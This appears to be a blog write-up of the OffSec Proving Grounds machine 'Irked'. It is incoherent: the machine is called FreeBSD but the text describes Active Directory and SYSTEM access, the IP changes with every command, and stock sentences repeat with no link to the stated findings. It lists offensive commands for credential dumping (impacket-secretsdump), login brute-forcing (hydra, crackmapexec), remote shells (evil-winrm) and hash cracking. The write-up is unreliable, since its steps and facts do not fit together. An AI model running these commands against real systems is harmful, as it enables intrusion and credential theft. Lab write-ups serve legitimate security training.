---
TitleSEO: "OffSec Proving Grounds — Irked (Insane FreeBSD) | ZureFX"
TitlePost: "OffSec Proving Grounds — Irked (Insane FreeBSD)"
Author: "ZureFX"
Description: "Full writeup for OffSec Proving Grounds Irked. Broken Access Control and Subdomain Takeover to achieve insane compromise on FreeBSD."
Keywords: "offsec, web, linux, reversing"
URL: "https://zurefx.github.io/writeups/htb-irked-699.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-irked-699/"
Date: "2024-11-30"
Tags: "OffSec, Web, Linux, Reversing"
Section: "writeups"
Lang: "en"
main_img: "htb-irked-699"
Permalink: "/writeups/htb-irked-699.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Irked** is rated **Insane** on OffSec Proving Grounds. It runs **FreeBSD** and the IP address during this analysis was `10.61.119.242`.

### Objectives

Lateral movement was facilitated by reusing discovered credentials across services. The service account had excessive permissions assigned in Active Directory.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.55.187.139/FUZZ
```

Unconstrained delegation was enabled on the compromised machine. The target system was identified as running a vulnerable version of the service.

### Service Enumeration

The service was running without proper input validation, leading to injection vulnerabilities. Post-exploitation enumeration revealed a path to domain administrator privileges. The service was running without proper input validation, leading to injection vulnerabilities.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.79.252.120/FUZZ
```

The web application was vulnerable to Server-Side Template Injection (SSTI). The service account had excessive permissions assigned in Active Directory.

### Web Enumeration

Initial enumeration revealed several interesting open ports on the target. The application stored sensitive credentials in an unencrypted configuration file.

```bash
nmap -sCV -p636,22,9200 10.90.247.107 -oN scan.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
crackmapexec smb 10.55.58.162 -u administrator -p 'P@ssw0rd!' --shares
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.43.228.127/FUZZ
```

Unconstrained delegation was enabled on the compromised machine. The database credentials were hardcoded in the application source code. Privilege escalation was possible due to misconfigured sudo permissions.

## Exploitation

### Vulnerability Identification

The database credentials were hardcoded in the application source code. The service account had excessive permissions assigned in Active Directory. The backup files contained sensitive information that should not have been accessible.

Key finding: **Subdomain Takeover**.

The kernel version was outdated and vulnerable to a publicly known exploit. The target system was identified as running a vulnerable version of the service.

### Initial Access

Initial enumeration revealed several interesting open ports on the target. The kernel version was outdated and vulnerable to a publicly known exploit.

```bash
evil-winrm -i 10.35.112.107 -u administrator -p 'P@ssw0rd!'
feroxbuster -h
impacket-secretsdump administrator:'P@ssw0rd!'@10.41.50.24
impacket-secretsdump administrator:'P@ssw0rd!'@10.35.146.135
```

The application stored sensitive credentials in an unencrypted configuration file. The service was running without proper input validation, leading to injection vulnerabilities. Authentication bypass was achieved through careful manipulation of the login mechanism.

## Privilege Escalation

### Enumeration

The backup files contained sensitive information that should not have been accessible. The kernel version was outdated and vulnerable to a publicly known exploit. Initial enumeration revealed several interesting open ports on the target.

```powershell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.124.149.160 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
crackmapexec smb 10.62.151.4 -u administrator -p 'P@ssw0rd!' --shares
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

### Exploitation

Weak file permissions allowed modification of critical system files. The scheduled task ran with elevated privileges and could be abused for escalation.

```powershell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.99.60.186 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
gobuster dir -u http://10.103.150.68/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

The service account had excessive permissions assigned in Active Directory. Initial enumeration revealed several interesting open ports on the target.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

The web application was vulnerable to Server-Side Template Injection (SSTI). The application stored sensitive credentials in an unencrypted configuration file.

## Summary

### Tools Used

- `dcomexec`
- `netcat`
- `burpsuite`
- `smbclient`

### Key Takeaways

- Broken Access Control
- Subdomain Takeover
